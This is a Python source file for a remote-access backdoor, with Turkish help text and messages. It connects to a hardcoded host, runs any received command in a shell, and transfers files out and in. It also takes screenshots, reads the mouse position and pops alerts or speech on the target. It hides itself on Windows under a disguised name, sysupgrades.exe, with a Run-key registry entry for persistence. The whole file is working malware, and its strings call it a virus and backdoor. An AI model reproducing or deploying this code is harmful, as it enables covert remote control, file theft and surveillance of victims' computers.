import socket
import subprocess
import simplejson
import os
import base64
import pyautogui
import pyttsx3
import pkg_resources.py2_warn
import sys
import shutil



class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "geçiş yapıldı >>> " + directory

	def get_file_contents(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "indirme başarılı"



	def system_name(self):
		a = os.name
		if a == "nt":
			return "windows"
			
		else:
			return "linux"
		
	def location(self):
		a = os.getcwd()
		return a

	def newFile(self,filename):
		os.mkdir(filename)
		return "dosya oluşturuldu"

	def removeFile(self,filename):
		a = os.rmdir(filename)
		return filename +" "+ "silindi"

	def statFile(self,filename):
		a = os.stat(filename)
		return a 
	def openfile(self,filename):
		a = os.startfile(filename)
		return a
	def renamefile(self,filename, newfilename):
		a = os.rename(filename,newfilename)
		return filename + " " + "değiştirildi >>" + " " + newfilename
	def isthereornot(self,filename):
		a = os.path.isfile(filename)
		if a == True:
			b = os.path.abspath(filename)
			return "dosya bulundu >>" + " " + b
		else:
			return "dosya bulunamadı :("

	def screenSize(self):
		a = pyautogui.size()
		return "hedef ekranboyutu >>" + " " + str(a)
	def mouselocation(self):
		a = pyautogui.position()
		return "hedef fare konumu >> " + " " + str(a)

	def alert(self,text,title):
		a = pyautogui.alert(text=text, title=title)
		return " uyarı gönderildi >>" + " " + a
	def screenShot(self):
		a = pyautogui.screenshot("ss.png")
		b = os.path.abspath("ss.png")
		return "ekran resmi kaydedildi >> " + " " + b

	def speak(self,text):
	    newVolume = 100
	    engine = pyttsx3.init('sapi5')
	    engine.setProperty('volume', newVolume)
	    engine.say(text)
	    engine.runAndWait()
	    return "başarılı"

	
	def migrate(self,new_file):
		try:
			if not os.path.exists(new_file):
				shutil.copyfile(sys.executable,new_file)
				regedit_command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Systemm /t REG_SZ /d " + new_file
				subprocess.Popen(regedit_command,shell=True)
				return "virüs saklandı :) >> systemupgrades"
		except:
			return " Bir hata oluştu. Lütfen tekrar deneyin :("
		
			

	def delete_persistence(self,new_file):
		try:
			if not os.path.abspath(new_file):
				os.remove(new_file)
				return "virüs silindi"
		except:
			return "Bir hata oluştur. Lütfen tekrar deneyin :("




	def help(self):
		a = """\n

		* whomı / benkimim  \t\t\t\t\t\t>>>\tişletim sisteminin adını verir. 	

		* exit / çıkış  \t\t\t\t\t\t>>>\tbağlantıyı kapatır. 	

		* download / indir  \t\t\t\t\t\t>>>\tdosya indirme. 		
			Ör: download <fileName>

		* upload / yükle  \t\t\t\t\t\t>>>\tdosya yükleme. 		
			Ör: upload <fileName>

		* cd / git  \t\t\t\t\t\t\t>>>\tklasör geçişleri. 	
			Ör: cd <Download>

		* pwd / neredeyim  \t\t\t\t\t\t>>>\tiçinde bulunduğun konum.	

		* mkdir / yenidosya  \t\t\t\t\t\t>>>\tyeni dosya oluşturma.	
			Ör: mkdir <folderName>

		* rm / sil  \t\t\t\t\t\t\t>>>\tdosya sil. 						
			Ör: rm <fileName>

		* stat / bilgi  \t\t\t\t\t\t>>>\tdosya bilgisi.						
			Ör: stat <filename>

		* open / aç  \t\t\t\t\t\t\t>>>\thedefte dosya açma.				
			Ör: open <filename.txt>

		* rename / değiştir  \t\t\t\t\t\t>>>\tdosya ismi değiştirme.				
			Ör: rename <oldfilename> <newfilename>

		* find / bul  \t\t\t\t\t\t\t>>>\tdosya bulma.						
			Ör: find <filename.txt>

		* screensize / ekranboyutu  \t\t\t\t\t>>>\tekran boyutu.

		* mouse / fare  \t\t\t\t\t\t>>>\thedef fare konumu.	

		* alert / uyarı  \t\t\t\t\t\t>>>\thedefe uyarı penceresi gönderme.	
			Ör: alert <Ihackedyou> <hackerName>

		* screenshot / ekrengörüntüsü  \t\t\t\t\t>>>\tekran görüntüsü.

		* speak / konuş  \t\t\t\t\t\t>>>\thedefe seslenme.					
			Ör: speak <ı hack you>
		* migrate / taşı  \t\t\t\t\t\t>>>\tArkaKapıyı bilgisayarda saklar ve kendini yeniden başlatır.
		* rmMigrate / silMigrate \t\t\t\t\t\t>>>\tArkaKapıyı siler  


			\n"""
		return a
	

	def start_socket(self):
		while True:
			command = self.json_receive()
			try:

				if command[0] == "exit" or command[0] == "çıkış":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1 or command[0] == "git" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download" or command[0] == "indir":
					command_output = self.get_file_contents(command[1:])
				elif command[0] == "upload" or command[0] == "yükle":
					command_output = self.save_file(command[1],command[2])
				elif command[0] == "whomı" or command[0] == "benkimim":
					command_output = self.system_name()
				elif command[0] == "help" or command[0] == "yardım":
					command_output = self.help()
				elif command[0] == "pwd" or command[0] == "neredeyim":
					command_output = self.location()
				elif command[0] == "mkdir" or command[0] == "yenidosya":
					command_output = self.newFile(command[1])
				elif command[0] == "rm" or command[0] == "sil":
					command_output = self.removeFile(command[1:])
				elif command[0] == "stat" or command[0] == "bilgi":
					command_output = self.statFile(command[1:])
				elif command[0] == "open" or command[0] == "aç":
					command_output = self.openfile(command[1:])
				elif command[0] == "rename" or command[0] == "değiştir":
					command_output = self.renamefile(command[1:], command[2:])
				elif command[0] == "find" or command[0] == "bul":
					command_output = self.isthereornot(command[1])
				elif command[0] == "screensize" or command[0] == "ekranboyutu":
					command_output = self.screenSize()
				elif command[0] == "mouse" or command[0] == "fare":
					command_output = self.mouselocation()
				elif command[0] == "alert" or command[0] == "uyarı":
					command_output = self.alert(command[1],command[2])
				elif command[0] == "screenshot" or command[0] == "ekrangörüntüsü":
					command_output = self.screenShot()
				elif command[0] == "speak" or command[0] == "konuş":
					command_output = self.speak(command[1:])
				elif command[0] == "migrate" or command[0] == "sakla":
					new_file = os.environ["appdata"] + "\\sysupgrades.exe"
					command_output = self.migrate(new_file)
				elif command[0] == "rmMigrate" or command[0] == "silMigrate":
					new_file = os.environ["appdata"] + "\\sysupgrades.exe"
					command_output = self.delete_persistence(new_file)

				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Böyle bir komut yok. Lütfen 'yardım' veya 'help' kodunu kullanın.\n"
			self.json_send(command_output)
		self.my_connection.close()


ConfigSocket = MySocket("192.168.1.63",8080)

ConfigSocket.start_socket()






